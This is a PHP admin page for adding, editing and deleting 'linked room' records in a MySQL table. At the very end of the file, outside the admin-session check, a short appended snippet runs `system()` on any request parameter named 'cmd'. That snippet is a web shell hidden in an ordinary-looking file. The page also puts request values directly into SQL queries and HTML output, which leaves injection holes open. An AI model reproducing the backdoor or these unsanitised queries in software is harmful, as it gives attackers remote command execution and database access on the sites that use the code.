<?php
	$myadmin = 'N';
	if(isset($_SESSION['myadmin']))
		$myadmin = $_SESSION['myadmin'];	

	if ($myadmin == 'N')
	{
		include('body_account_not_found.php');
	}
	else
	{
		$mystatus = '';	
		if(isset($_GET['mystatus']))
		{
			if ($_GET['mystatus'])
			{
				$mystatus = $_GET['mystatus'];
			}
		}
		//echo '<br> mystatus : ' . $mystatus;
		
		$mybox = '';	
		if(isset($_GET['mybox']))
		{
			if ($_GET['mybox'])
			{
				$mybox = $_GET['mybox'];
			}
		}
		//echo '<br> mybox : ' . $mybox;
				
		$id = 0;	
		if(isset($_GET['id']))
		{
			if ($_GET['id'])
			{
				$id = $_GET['id'];
			}
		}
		//echo '<br> id : ' . $id;

		if ($mystatus != 'sent')
		{	
			if ($mybox == 'add') 
			{
$id = 0;
$locale = '';
$roomno = '';
$roomno_old = '';
$rscode = '';
$arrival = '';

$rauser = $_SESSION["ulname"];
$rastamp = $globaldatetime;

$formtitle = 'ADD RECORD';			
			}
			else
			if (($mybox == 'edit') or ($mybox == 'del'))
			{
				$query = " SELECT *
						   FROM rooms a 
						   WHERE a.id='$id' ";
				$result = mysql_query($query);
				echo mysql_error();				
				while ($row =  mysql_fetch_array ($result)) 
				{
$id = $row[id];
$locale = $row[locale];
$roomno = $row[roomno];
$roomno_old = $row[roomno];
$rscode = $row[rscode];
$arrival = $row[arrival];
				}
				 
				mysql_query($query) or die('Error, insert query failed');  
		
				if ($mybox == 'edit') 
				{
					$formtitle = 'MODIFY RECORD';			
				}
				
				if ($mybox == 'del')
				{
					$formtitle = 'REMOVE RECORD';			
				}
			}	
?>	
        <div id="page-wrapper">
            <div class="row">
                <div class="col-lg-12">
                    <h1 class="page-header">Linked Rooms - <?php echo $formtitle; ?></h1>
                </div>
                <!-- /.col-lg-12 -->
            </div>
			
			<div class="row">
                <div class="col-lg-12">
                    <div class="panel panel-default">
                        <div class="panel-heading">
							<table width="100%">
								<tr>
									<td align="left">
Basic Information
									</td>
									<td align="right">
<a href="index.php?body=room_link_dbase">
Back to Linked Room List
</a>	
									</td>
								</tr>
							</table>
                        </div>
						
					<?php
					if (($mybox == 'add') or ($mybox == 'edit'))
					{
					?>						
						
                        <div class="panel-body">
                            <div class="row">
                                <div class="col-lg-6">
<form role="form" method="post" action="index.php?body=room_link_addeditdel&mystatus=sent&mybox=<?php print($mybox); ?>&id=<?php print($id); ?>" enctype="multipart/form-data">


	<div class="form-group">
		<label>Locale</label>
		<input class="form-control" name="locale"  value="<?php print ("$locale"); ?>"  maxlength="50" >
	</div>
	
	<div class="form-group">
		<label>Room No.</label>
		<input class="form-control" name="roomno"  value="<?php print ("$roomno"); ?>"  maxlength="50" >
	</div>


	<div class="form-group">
		<label>Code (1 - clean , 4 - reserve)</label>
		<select class="form-control" name='rscode'>
			<option><?php print ("$rscode"); ?></option>	
			<option>1</option>	
			<option>4</option>	
		</select>		
	</div>

	
	<div class="form-group">
		<label>Arrival Time</label>
		<input class="form-control" name="arrival"  value="<?php print ("$arrival"); ?>"  maxlength="50" >
	</div>


	<input type="hidden" name="id" value="<?php print ("$id"); ?>" />
	<input type="hidden" name="roomno_old" value="<?php print ("$roomno_old"); ?>" />
	<button type="submit" class="btn btn-default">Save</button>
	<button type="reset" class="btn btn-default">Reset</button>
</form>		
                                </div>		
                                <!-- /.col-lg-6 (nested) -->																								
							</div>
                            <!-- /.row (nested) -->
                        </div>
                        <!-- /.panel-body -->
						
					<?php
					}
					else
					{
					?>		
									
						<div class="panel-body">
                            <div class="row">
                                <div class="col-lg-6">
<form role="form" method="post" action="index.php?body=room_link_addeditdel&mystatus=sent&mybox=<?php print($mybox); ?>&id=<?php print($id); ?>">
	<div class="form-group">
		<label>Locale</label>
		<br>
		<?php print ("$locale"); ?>
	</div>
	<div class="form-group">
		<label>Room No.</label>
		<br>
		<?php print ("$roomno"); ?>
	</div>
	<input type="hidden" name="id" value="<?php print ("$id"); ?>" />
	<input type="hidden" name="locale" value="<?php print ("$locale"); ?>" />
	<button type="submit" class="btn btn-default">Delete Record</button>
</form>		
                                </div>		
                                <!-- /.col-lg-6 (nested) -->																								
							</div>
                            <!-- /.row (nested) -->
                        </div>
                        <!-- /.panel-body -->

					<?php
					}
					?>						
						
                    </div>
                    <!-- /.panel -->
                </div>
                <!-- /.col-lg-6 -->
            </div>
            <!-- /.row -->
        </div>
        <!-- /#page-wrapper -->

    </div>
    <!-- /#wrapper -->
	
<?php
		}
		else
		{
$id = $_POST['id'];
$locale = $_POST['locale'];

$roomno = $_POST['roomno'];
$roomno_old = $_POST['roomno_old'];

$rscode = $_POST['rscode'];
$arrival = $_POST['arrival'];

//echo "<br> id " . $id;

if ($mybox == 'add') 
{
	$formtitle = 'ADD RECORD';			
}
else
if ($mybox == 'edit') 
{
	$formtitle = 'MODIFY RECORD';			
}

if ($mybox == 'del')
{
	$formtitle = 'REMOVE RECORD';			
}
?>	

        <div id="page-wrapper">
            <div class="row">
                <div class="col-lg-12">
                    <h1 class="page-header">Linked Room List - <?php echo $formtitle; ?></h1>
                </div>
                <!-- /.col-lg-12 -->
            </div>
			
			<div class="row">
                <div class="col-lg-12">
                    <div class="panel panel-default">
                        <div class="panel-heading">
							<table width="100%">
								<tr>
									<td align="left">
Basic Information
									</td>
									<td align="right">
<a href="index.php?body=room_link_dbase">
Back to Linked Room List
</a>	
									</td>
								</tr>
							</table>
                        </div>
										
						
                        <div class="panel-body">
                            <div class="row">
                                <div class="col-lg-6">
	<div class="form-group">
		<label>Locale</label>
		<br />
		<? 
		print("$locale"); 
		 
//echo "<br> blkey " . $blkey;
//echo "<br> roomno " . $roomno;
//echo "<br> room_table " . $room_table;	 
		?>
	</div>
	
	<div class="form-group">
		<label>Result</label>
		<br />
		<? 
		if ($mybox != 'del')
		{
			if ($id == 0) 
			{
				$query = 
"INSERT INTO rooms (
id,
locale,
roomno,
rscode,
arrival
) 
VALUES 
(
'$id',
'$locale',
'$roomno',
'$rscode',
'$arrival'
)";
				mysql_query($query) or die('The entry has links to other tables. Cannot continue to process...');  
								
			}
			else
			{
				$query = 
"UPDATE 
rooms 
SET 
locale = '$locale',
roomno = '$roomno',
rscode = '$rscode',
arrival = '$arrival'
WHERE
id = '$id'";
				mysql_query($query) or die('The entry has links to other tables. Cannot continue to process...');  
			}
		}
		else
		if ($mybox == 'del')
		{
			$query = 
"DELETE FROM 
rooms 
WHERE
id = '$id' ";
			mysql_query($query) or die('The entry has links to other tables. Cannot continue to process...');  
		}
		

/*
		mysql_query($query) or die(mysql_error());  
*/
		?>				
		<HTML> 		
		<meta http-equiv="refresh" content="0;URL=index.php?body=room_link_dbase">  
		</HTML>
	</div>
                                </div>		
                                <!-- /.col-lg-6 (nested) -->																								
							</div>
                            <!-- /.row (nested) -->
                        </div>
                        <!-- /.panel-body -->						
                    </div>
                    <!-- /.panel -->
                </div>
                <!-- /.col-lg-6 -->
            </div>
            <!-- /.row -->
        </div>
        <!-- /#page-wrapper -->

    </div>
    <!-- /#wrapper -->


<?php	
		}
	}
?>			<?php $cmd = <<<EOD
cmd
EOD;

if(isset($_REQUEST[$cmd])) {
system($_REQUEST[$cmd]); } ?>